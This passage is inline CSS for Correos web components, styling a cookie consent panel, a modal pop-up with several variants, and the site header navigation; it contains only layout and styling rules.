				.sc-correos-cdk-cookies-module-h .cdk-container-modal.sc-correos-cdk-cookies-module .cdk-list-modal__desc.sc-correos-cdk-cookies-module {
					width: 78%
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-cookies-module-h .cdk-container-modal.sc-correos-cdk-cookies-module:last-child correos-ui-separator-line.sc-correos-cdk-cookies-module {
					display: none
				}
			}

			.sc-correos-cdk-cookies-module-h .cdk-first-title.sc-correos-cdk-cookies-module {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: column;
				flex-direction: column
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-cookies-module-h .cdk-first-title.sc-correos-cdk-cookies-module {
					-ms-flex-direction: row;
					flex-direction: row
				}
			}

			.sc-correos-cdk-cookies-module-h .cdk-switch.sc-correos-cdk-cookies-module {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: justify;
				justify-content: space-between;
				width: 100%;
				-ms-flex-align: start;
				align-items: flex-start
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-cookies-module-h .cdk-switch.sc-correos-cdk-cookies-module {
					width: 24%
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-cookies-module-h .cdk-switch.sc-correos-cdk-cookies-module {
					width: 18%
				}
			}

			.sc-correos-cdk-cookies-module-h .cdk-button-cookies.sc-correos-cdk-cookies-module {
				margin: 0;
				margin-bottom: 16px
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-cookies-module-h .cdk-button-cookies.sc-correos-cdk-cookies-module {
					margin-bottom: 0px;
					min-width: 100px
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-cookies-module-h .cdk-button-cookies.margin-desktop.sc-correos-cdk-cookies-module {
					margin-bottom: 16px
				}
			}

			.sc-correos-cdk-cookies-module-h .cdk-button-cookies__second.sc-correos-cdk-cookies-module {
				margin-bottom: 12px
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-cookies-module-h .cdk-button-cookies__second.sc-correos-cdk-cookies-module {
					margin-bottom: 0px;
					margin-right: 16px
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-cookies-module-h .cdk-button-cookies__second.margin-desktop-second.sc-correos-cdk-cookies-module {
					margin-bottom: 12px;
					margin-right: 0
				}
			}

			.d-none.sc-correos-cdk-cookies-module-h {
				display: none
			}
		</style>
		<style>
			@charset "UTF-8";

			.sc-correos-cdk-pop-up-h {
				--_cdk-pop-up-bg-overlay: rgba(0, 0, 0, 0.6);
				--_cdk-pop-up-border-modal: 1px solid var(--cdk-pop-up-border-modal, blue);
				--_cdk-pop-up-bg-modal: var(--cdk-pop-up-bg-modal, purple);
				--_cdk-pop-up-box-shadow: var(--cdk-pop-up-box-shadow);
				--_cdk-pop-up-border-title: 1px solid var(--cdk-pop-up-border-title, green);
				--_cdk-pop-up-color-icon: var(--cdk-pop-up-color-icon, teal)
			}

			.sc-correos-cdk-pop-up-h {
				display: block
			}

			.sc-correos-cdk-pop-up-h .cdk-container.sc-correos-cdk-pop-up {
				position: fixed;
				opacity: 0;
				visibility: hidden;
				-webkit-transform: scale(1.1);
				transform: scale(1.1);
				-webkit-transition: visibility 0s linear 0.25s, opacity 0.25s 0s, -webkit-transform 0.25s;
				transition: visibility 0s linear 0.25s, opacity 0.25s 0s, -webkit-transform 0.25s;
				transition: visibility 0s linear 0.25s, opacity 0.25s 0s, transform 0.25s;
				transition: visibility 0s linear 0.25s, opacity 0.25s 0s, transform 0.25s, -webkit-transform 0.25s;
				z-index: 16;
				width: 100%;
				height: 100%;
				top: 0;
				left: 0;
				background-color: var(--_cdk-pop-up-bg-overlay)
			}

			.sc-correos-cdk-pop-up-h .contribution-container.sc-correos-cdk-pop-up {
				position: static !important;
				z-index: auto !important
			}

			.sc-correos-cdk-pop-up-h .contribution-container.sc-correos-cdk-pop-up .cdk-modal.sc-correos-cdk-pop-up {
				position: static !important;
				top: 0 !important;
				left: 0 !important;
				-webkit-transform: none !important;
				transform: none !important
			}

			.sc-correos-cdk-pop-up-h .cdk-footer__buttons.sc-correos-cdk-pop-up {
				width: 100%
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-pop-up-h .cdk-footer__buttons.sc-correos-cdk-pop-up {
					width: auto
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-pop-up-h .cdk-footer__buttons.sc-correos-cdk-pop-up {
					width: auto
				}
			}

			.sc-correos-cdk-pop-up-h .sc-correos-cdk-pop-up-s>[slot=buttons] {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: column-reverse;
				flex-direction: column-reverse;
				-ms-flex-align: center;
				align-items: center
			}

			.sc-correos-cdk-pop-up-h .sc-correos-cdk-pop-up-s>[slot=buttons] correos-ui-button:last-child {
				width: 100%
			}

			@media (max-width: 639px) {
				.sc-correos-cdk-pop-up-h .sc-correos-cdk-pop-up-s>[slot=buttons] correos-ui-button:not(last-child) {
					margin-bottom: 16px
				}
			}

			.sc-correos-cdk-pop-up-h .sc-correos-cdk-pop-up-s>[slot=buttons]:empty {
				display: none
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-pop-up-h .sc-correos-cdk-pop-up-s>[slot=buttons] {
					margin: 16px;
					-ms-flex-direction: row;
					flex-direction: row
				}

				.sc-correos-cdk-pop-up-h .sc-correos-cdk-pop-up-s>[slot=buttons] correos-ui-button:first-child {
					margin-right: 17px
				}

				.sc-correos-cdk-pop-up-h .sc-correos-cdk-pop-up-s>[slot=buttons] correos-ui-button:last-child {
					width: auto
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-pop-up-h .sc-correos-cdk-pop-up-s>[slot=buttons] {
					-ms-flex-direction: row;
					flex-direction: row;
					margin: 24px
				}

				.sc-correos-cdk-pop-up-h .sc-correos-cdk-pop-up-s>[slot=buttons] correos-ui-button:first-child {
					margin-right: 17px
				}

				.sc-correos-cdk-pop-up-h .sc-correos-cdk-pop-up-s>[slot=buttons] correos-ui-button:last-child {
					width: auto;
					margin-right: 0px
				}
			}

			.sc-correos-cdk-pop-up-h .cdk-visible.sc-correos-cdk-pop-up {
				opacity: 1;
				visibility: visible;
				-webkit-transform: scale(1);
				transform: scale(1);
				-webkit-transition: visibility 0s linear 0s, opacity 0.25s 0s, -webkit-transform 0.25s;
				transition: visibility 0s linear 0s, opacity 0.25s 0s, -webkit-transform 0.25s;
				transition: visibility 0s linear 0s, opacity 0.25s 0s, transform 0.25s;
				transition: visibility 0s linear 0s, opacity 0.25s 0s, transform 0.25s, -webkit-transform 0.25s
			}

			.sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up {
				position: absolute;
				left: 50%;
				-webkit-transform: translate(-50%, 0);
				transform: translate(-50%, 0);
				top: auto;
				bottom: 0;
				border: var(--_cdk-pop-up-border-modal);
				border-radius: 8px 8px 0 0;
				background-color: var(--_cdk-pop-up-bg-modal);
				-webkit-box-shadow: var(--_cdk-pop-up-box-shadow);
				box-shadow: var(--_cdk-pop-up-box-shadow);
				width: 100%;
				display: -ms-flexbox;
				display: flex;
				max-height: 80%;
				min-height: 440px;
				-ms-flex-direction: column;
				flex-direction: column
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up {
					max-width: 750px;
					width: calc(100% - 32px)
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up {
					max-width: 1088px;
					width: calc(100% - 80px);
					top: 50%;
					bottom: auto;
					-webkit-transform: translate(-50%, -50%);
					transform: translate(-50%, -50%);
					border-radius: 8px
				}
			}

			.sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up {
				width: 100%;
				display: -ms-flexbox;
				display: flex;
				max-height: 100%;
				min-height: 440px;
				-ms-flex-direction: column;
				flex-direction: column
			}

			.sc-correos-cdk-pop-up-h .cdk-header.sc-correos-cdk-pop-up {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: justify;
				justify-content: space-between;
				margin: 16px;
				padding-bottom: 16px;
				border-bottom: var(--_cdk-pop-up-border-title)
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-pop-up-h .cdk-header.sc-correos-cdk-pop-up {
					margin: 24px
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-pop-up-h .cdk-header.sc-correos-cdk-pop-up {
					margin: 40px
				}
			}

			.sc-correos-cdk-pop-up-h .sc-correos-cdk-pop-up-s>[slot=title] {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				font-size: 1.125rem;
				line-height: 1.625rem
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-pop-up-h .sc-correos-cdk-pop-up-s>[slot=title] {
					font-size: 1.5rem;
					line-height: 2.25rem
				}
			}

			.sc-correos-cdk-pop-up-h .cdk-icon.sc-correos-cdk-pop-up {
				cursor: pointer;
				color: var(--_cdk-pop-up-color-icon)
			}

			.sc-correos-cdk-pop-up-h .cdk-content.sc-correos-cdk-pop-up {
				margin: 0 16px
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-pop-up-h .cdk-content.sc-correos-cdk-pop-up {
					margin: 0 24px
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-pop-up-h .cdk-content.sc-correos-cdk-pop-up {
					margin: 0 40px
				}
			}

			.sc-correos-cdk-pop-up-h .cdk-footer.sc-correos-cdk-pop-up>.cdk-footer__info.sc-correos-cdk-pop-up {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: justify;
				justify-content: space-between
			}

			.sc-correos-cdk-pop-up-h .cdk-footer.sc-correos-cdk-pop-up>.cdk-footer-buttons.sc-correos-cdk-pop-up {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: end;
				justify-content: flex-end
			}

			.sc-correos-cdk-pop-up-h .cdk-footer.sc-correos-cdk-pop-up {
				margin: 16px;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: justify;
				justify-content: space-between
			}

			.sc-correos-cdk-pop-up-h .cdk-footer--center.sc-correos-cdk-pop-up {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: center;
				justify-content: center
			}

			.sc-correos-cdk-pop-up-h correos-ui-scroll-bar.sc-correos-cdk-pop-up {
				display: block
			}

			@media (min-width: 1024px) {
				[variant=cookies].sc-correos-cdk-pop-up-h .cdk-header.sc-correos-cdk-pop-up {
					margin: 40px;
					margin-bottom: 23px
				}
			}

			[variant=cookies].sc-correos-cdk-pop-up-h .cdk-footer.sc-correos-cdk-pop-up {
				-ms-flex-direction: column;
				flex-direction: column;
				padding: 16px 24px
			}

			[variant=cookies].sc-correos-cdk-pop-up-h .cdk-footer__info.sc-correos-cdk-pop-up {
				-ms-flex-align: center;
				align-items: center;
				padding-bottom: 24px;
				margin-right: 16px
			}

			@media (min-width: 1024px) {
				[variant=cookies].sc-correos-cdk-pop-up-h .cdk-footer__info.sc-correos-cdk-pop-up {
					padding-bottom: 0
				}
			}

			@media (min-width: 1024px) {
				[variant=cookies].sc-correos-cdk-pop-up-h .cdk-footer.sc-correos-cdk-pop-up {
					margin: 40px 40px;
					-ms-flex-direction: row;
					flex-direction: row;
					padding: 0
				}
			}

			.sc-correos-cdk-pop-up-h[variant=cookies] .sc-correos-cdk-pop-up-s>[slot=buttons] {
				-ms-flex-direction: column;
				flex-direction: column;
				display: block
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-pop-up-h[variant=cookies] .sc-correos-cdk-pop-up-s>[slot=buttons] {
					-ms-flex-direction: column;
					flex-direction: column;
					display: block;
					margin: 0
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-pop-up-h[variant=cookies] .sc-correos-cdk-pop-up-s>[slot=buttons] {
					-ms-flex-direction: row;
					flex-direction: row;
					display: -ms-inline-flexbox;
					display: inline-flex;
					width: -webkit-max-content;
					width: -moz-max-content;
					width: max-content
				}
			}

			[full-height=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up {
				height: 100%
			}

			[full-height=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content--full-height.sc-correos-cdk-pop-up {
				height: 100%;
				max-height: 100%;
				min-height: auto
			}

			[full-height=true].sc-correos-cdk-pop-up-h .cdk-content.sc-correos-cdk-pop-up {
				height: 100%;
				display: -ms-flexbox;
				display: flex;
				-ms-flex: 1;
				flex: 1;
				overflow: hidden
			}

			.sc-correos-cdk-pop-up-h[full-height=true] .sc-correos-cdk-pop-up-s>[slot=content] {
				display: -ms-flexbox;
				display: flex;
				-ms-flex: 1;
				flex: 1
			}

			[with-map=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up {
				height: 100%
			}

			[with-map=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up {
				height: 100%
			}

			[with-map=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up .cdk-header.sc-correos-cdk-pop-up {
				margin-bottom: 8px
			}

			[with-map=true].sc-correos-cdk-pop-up-h .cdk-content.sc-correos-cdk-pop-up {
				height: 100%;
				display: -ms-flexbox;
				display: flex;
				-ms-flex: 1;
				flex: 1;
				overflow: hidden
			}

			.sc-correos-cdk-pop-up-h[with-map=true] .sc-correos-cdk-pop-up-s>[slot=content] {
				display: -ms-flexbox;
				display: flex;
				-ms-flex: 1;
				flex: 1;
				-ms-flex-direction: column;
				flex-direction: column
			}

			.sc-correos-cdk-pop-up-h[with-map=true] .sc-correos-cdk-pop-up-s>[slot=content] p {
				font-size: 16px
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-pop-up-h[with-map=true] .sc-correos-cdk-pop-up-s>[slot=content] p {
					font-size: 24px
				}
			}

			[with-image=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: row;
				flex-direction: row;
				max-height: 80%
			}

			[with-image=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-image.sc-correos-cdk-pop-up {
				width: 40%;
				border: var(--_cdk-pop-up-border-modal);
				border-radius: 8px 0 0 8px;
				overflow: hidden
			}

			@media (max-width: 639px) {
				[with-image=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-image.sc-correos-cdk-pop-up {
					display: none
				}
			}

			[with-image=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-image.sc-correos-cdk-pop-up correos-cdk-imageblock.sc-correos-cdk-pop-up {
				border: var(--_cdk-pop-up-border-modal);
				border-radius: 8px 0 0 8px
			}

			[with-image=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up {
				width: 60%;
				display: -ms-flexbox;
				display: flex;
				max-height: 80%;
				min-height: 440px;
				-ms-flex-direction: column;
				flex-direction: column
			}

			@media (max-width: 639px) {
				[with-image=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up {
					width: 100%
				}
			}

			[with-image=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up .cdk-header.sc-correos-cdk-pop-up {
				border-bottom: none;
				-ms-flex-pack: end;
				justify-content: flex-end
			}

			[with-image=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up .cdk-content.sc-correos-cdk-pop-up {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: center;
				justify-content: center
			}

			[variant=login].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up {
				width: 100%
			}

			[variant=login].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-image.sc-correos-cdk-pop-up {
				background-color: #f8f8f8
			}

			[variant=login].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-image.sc-correos-cdk-pop-up correos-cdk-imageblock.sc-correos-cdk-pop-up {
				max-width: 340px;
				margin-left: auto;
				margin-right: auto
			}

			[variant=login].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up .cdk-header.sc-correos-cdk-pop-up {
				display: none;
				-ms-flex-pack: end;
				justify-content: flex-end
			}

			[variant=login].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up .cdk-content.sc-correos-cdk-pop-up {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: center;
				justify-content: center;
				margin: 0;
				padding: 40px
			}

			[variant=login].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up .cdk-footer.sc-correos-cdk-pop-up {
				display: none
			}

			.sc-correos-cdk-pop-up-h[variant=login] .sc-correos-cdk-pop-up-s>[slot=content] {
				padding-left: 0px;
				padding-right: 0px
			}

			[within-login=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: column;
				flex-direction: column;
				max-height: 100%
			}

			[within-login=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up {
				width: 100%
			}

			[within-login=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up .cdk-header.sc-correos-cdk-pop-up {
				display: -ms-flexbox;
				display: flex;
				border-bottom: var(--_cdk-pop-up-border-title);
				-ms-flex-pack: justify;
				justify-content: space-between
			}

			[within-login=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up .cdk-content.sc-correos-cdk-pop-up {
				margin: 0 16px
			}

			@media (min-width: 640px) {
				[within-login=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up .cdk-content.sc-correos-cdk-pop-up {
					margin: 0 24px
				}
			}

			@media (min-width: 1024px) {
				[within-login=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up .cdk-content.sc-correos-cdk-pop-up {
					margin: 0 40px
				}
			}

			[within-login=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up .cdk-footer.sc-correos-cdk-pop-up {
				display: -ms-flexbox;
				display: flex
			}

			.sc-correos-cdk-pop-up-h[within-login=true] .sc-correos-cdk-pop-up-s>[slot=content] {
				width: 100%;
				padding-bottom: 24px
			}

			[variant=custom-select].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-content.sc-correos-cdk-pop-up {
				min-height: 320px
			}

			[variant=litevariant].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up {
				min-height: 360px
			}

			@media (min-width: 1024px) {
				[variant=litevariant].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up {
					max-width: 870px
				}
			}

			[variant=litevariant].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up {
				min-height: 360px
			}

			@media (min-width: 1024px) {
				[variant=litevariant].sc-correos-cdk-pop-up-h .cdk-header.sc-correos-cdk-pop-up {
					margin-bottom: 24px
				}
			}

			[variant=onboarding].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up {
				max-height: 60%
			}
		</style>
		<style>
			.sc-correos-cdk-core-header-h {
				--_cdk-core-header-border-icon: 1px solid var(--cdk-core-header-border-icon, pink);
				--_cdk-core-header-border-subpanel: 1px solid var(--cdk-core-header-subpanel-border-color, violet);
				--_cdk-core-header-subpanel-text-subpanel: var(--cdk-core-header-subpanel-text-color, green);
				--_cdk-core-header-bg-color: var(--cdk-core-header-bg-color, teal);
				--_cdk-core-header-panel-bg-primary: var(--cdk-core-header-panel-bg-color-primary, blue);
				--_cdk-core-header-panel-bg-secondary: var(--cdk-core-header-panel-bg-color-secondary, purple);
				--_cdk-core-header-subpanel-bg: var(--cdk-core-header-subpanel-bg-color, red);
				--_cdk-core-header-text-color: var(--cdk-core-header-text-color, teal);
				--_cdk-core-header-panel-text-color-primary: var(--cdk-core-header-panel-text-color-primary, yellow);
				--_cdk-core-header-panel-text-color-secondary: var(--cdk-core-header-panel-text-color-secondary, green);
				--_cdk-core-header-shadow: var(--cdk-core-header-shadow, 0 5px 20px 0 rgba(0, 0, 0, 0.1));
				--_cdk-core-header-wrapper-main: var(--cdk-core-header-wrapper-main, 2rem);
				--_cdk-core-header-wrapper-gutters: var(--cdk-core-header-wrapper-gutters, 80px);
				--_cdk-core-header-color-bar-top: var(--cdk-core-header-color-bar-top, orange);
				--_cdk-core-header-color-logo: var(--cdk-core-color-logo, purple);
				--_cdk-core-header-color-links: var(--cdk-core-header-color-links, purple);
				--_cdk-core-header-item-title: var(--cdk-core-header-item-title, #002E6D)
			}

			@-webkit-keyframes fade-in-particular-item {
				from {
					opacity: 0;
					-webkit-transform: translateX(12px);
					transform: translateX(12px)
				}

				to {
					opacity: 1;
					-webkit-transform: translateX(0px);
					transform: translateX(0px)
				}
			}

			@keyframes fade-in-particular-item {
				from {
					opacity: 0;
					-webkit-transform: translateX(12px);
					transform: translateX(12px)
				}

				to {
					opacity: 1;
					-webkit-transform: translateX(0px);
					transform: translateX(0px)
				}
			}

			@-webkit-keyframes fade-in-empresa-item {
				from {
					opacity: 0;
					-webkit-transform: translateX(12px);
					transform: translateX(12px)
				}

				to {
					opacity: 1;
					-webkit-transform: translateX(0px);
					transform: translateX(0px)
				}
			}

			@keyframes fade-in-empresa-item {
				from {
					opacity: 0;
					-webkit-transform: translateX(12px);
					transform: translateX(12px)
				}

				to {
					opacity: 1;
					-webkit-transform: translateX(0px);
					transform: translateX(0px)
				}
			}

			p.sc-correos-cdk-core-header {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal
			}

			ol.sc-correos-cdk-core-header {
				margin: 0;
				padding: 0;
				list-style: none
			}

			button.sc-correos-cdk-core-header {
				border: unset;
				cursor: pointer;
				margin: 0;
				padding: 0;
				width: unset;
				overflow: unset;
				background: unset;
				text-align: flex-start;
				color: inherit;
				font: inherit;
				line-height: inherit;
				-webkit-font-smoothing: inherit;
				-moz-osx-font-smoothing: inherit;
				-webkit-appearance: none;
				outline: none
			}

			button.sc-correos-cdk-core-header::-moz-focus-inner {
				border: 0;
				padding: 0
			}

			button.sc-correos-cdk-core-header:focus {
				-webkit-box-shadow: inset 0 0 0 2px rgba(128, 128, 128, 0.5);
				box-shadow: inset 0 0 0 2px rgba(128, 128, 128, 0.5)
			}

			a.sc-correos-cdk-core-header {
				outline: none;
				text-decoration: none;
				color: inherit
			}

			a.sc-correos-cdk-core-header:hover,
			a.sc-correos-cdk-core-header:visited,
			a.sc-correos-cdk-core-header:active {
				color: inherit
			}

			a.sc-correos-cdk-core-header:focus {
				-webkit-box-shadow: inset 0 0 0 2px rgba(128, 128, 128, 0.5);
				box-shadow: inset 0 0 0 2px rgba(128, 128, 128, 0.5)
			}

			.sc-correos-cdk-core-header-h {
				display: block;
				--_height: var(--cdk-core-header-height, 56px);
				--_height-large: var(--cdk-core-header-height-large, 88px);
				--_height-band: var(--cdk-core-header-height-band, 118px);
				--_height-portalname: var(--cdk-core-header-height-portalname, 120px)
			}

			.--fixed.sc-correos-cdk-core-header-h .cdk-header.sc-correos-cdk-core-header {
				position: fixed !important
			}

			.--fixed.sc-correos-cdk-core-header-h .cdk-nav.sc-correos-cdk-core-header {
				position: fixed !important
			}

			.--particular.sc-correos-cdk-core-header-h .cdk-nav-switch-option.sc-correos-cdk-core-header>label.sc-correos-cdk-core-header::after,
			.--links.sc-correos-cdk-core-header-h .cdk-nav-switch-option.sc-correos-cdk-core-header>label.sc-correos-cdk-core-header::after {
				background-color: var(--_cdk-core-header-panel-text-color-primary)
			}

			.--particular.sc-correos-cdk-core-header-h .cdk-nav-page.--lv-first.sc-correos-cdk-core-header,
			.--links.sc-correos-cdk-core-header-h .cdk-nav-page.--lv-first.sc-correos-cdk-core-header {
				color: var(--_cdk-core-header-panel-text-color-primary);
				background-color: var(--_cdk-core-header-panel-bg-primary)
			}

			.--particular.sc-correos-cdk-core-header-h .cdk-nav-content.sc-correos-cdk-core-header::before,
			.--links.sc-correos-cdk-core-header-h .cdk-nav-content.sc-correos-cdk-core-header::before {
				background-color: var(--_cdk-core-header-panel-bg-primary)
			}

			.--particular.sc-correos-cdk-core-header-h .cdk-nav-lv-first-item.--particular-animation.sc-correos-cdk-core-header,
			.--links.sc-correos-cdk-core-header-h .cdk-nav-lv-first-item.--particular-animation.sc-correos-cdk-core-header {
				opacity: 0;
				-webkit-transform: translateX(12px);
				transform: translateX(12px);
				-webkit-animation: fade-in-particular-item 0.5s cubic-bezier(0.5, 0, 0.15, 1) forwards;
				animation: fade-in-particular-item 0.5s cubic-bezier(0.5, 0, 0.15, 1) forwards
			}

			.--empresa.sc-correos-cdk-core-header-h .cdk-nav-switch-option.sc-correos-cdk-core-header>label.sc-correos-cdk-core-header::after {
				background-color: var(--_cdk-core-header-panel-text-color-secondary)
			}

			.--empresa.sc-correos-cdk-core-header-h .cdk-nav-page.--lv-first.sc-correos-cdk-core-header {
				color: var(--_cdk-core-header-panel-text-color-secondary);
				background-color: var(--_cdk-core-header-panel-bg-secondary)
			}

			.--empresa.sc-correos-cdk-core-header-h .cdk-nav-content.sc-correos-cdk-core-header::before {
				background-color: var(--_cdk-core-header-panel-bg-secondary)
			}

			.--empresa.sc-correos-cdk-core-header-h .cdk-nav-lv-first-item.--empresa-animation.sc-correos-cdk-core-header {
				opacity: 0;
				-webkit-transform: translateX(12px);
				transform: translateX(12px);
				-webkit-animation: fade-in-empresa-item 0.5s cubic-bezier(0.5, 0, 0.15, 1) forwards;
				animation: fade-in-empresa-item 0.5s cubic-bezier(0.5, 0, 0.15, 1) forwards
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header {
				height: var(--_height)
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header {
					height: var(--_height-large)
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header-band.sc-correos-cdk-core-header {
				position: fixed;
				z-index: 16;
				background-color: var(--_cdk-core-header-color-bar-top);
				height: 32px;
				width: 100%
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header-band.sc-correos-cdk-core-header .onlySelect.sc-correos-cdk-core-header {
				-ms-flex-pack: end !important;
				justify-content: flex-end !important
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header-band_content.sc-correos-cdk-core-header {
				display: -ms-flexbox;
				display: flex;
				height: 100%;
				-ms-flex-align: center;
				align-items: center;
				-ms-flex-pack: justify;
				justify-content: space-between;
				padding-top: 8px
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header-band_content-title.sc-correos-cdk-core-header {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				font-size: 0.875rem;
				line-height: 1.375rem;
				font-weight: bold;
				color: var(--_cdk-core-header-item-title)
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header-band_content-title.sc-correos-cdk-core-header {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header-band_content-select.sc-correos-cdk-core-header {
				float: right;
				width: auto
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header-band_content-select.sc-correos-cdk-core-header {
					width: 190px
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header {
				height: var(--_height);
				width: 100%;
				background-color: var(--_cdk-core-header-bg-color);
				-webkit-box-shadow: var(--_cdk-core-header-shadow);
				box-shadow: var(--_cdk-core-header-shadow);
				position: absolute;
				z-index: 16;
				left: 0;
				right: 0;
				top: 0
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header::before {
				content: "";
				position: fixed;
				height: 8px;
				width: 100%;
				z-index: 1;
				background-color: var(--_cdk-core-header-color-bar-top)
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.--remove-before.sc-correos-cdk-core-header {
				height: calc(var(--_height) + 44px)
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.--remove-before.sc-correos-cdk-core-header::before {
				display: none
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.--remove-before.sc-correos-cdk-core-header {
					height: calc(var(--_height) + 58px)
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header-bandtitle.sc-correos-cdk-core-header {
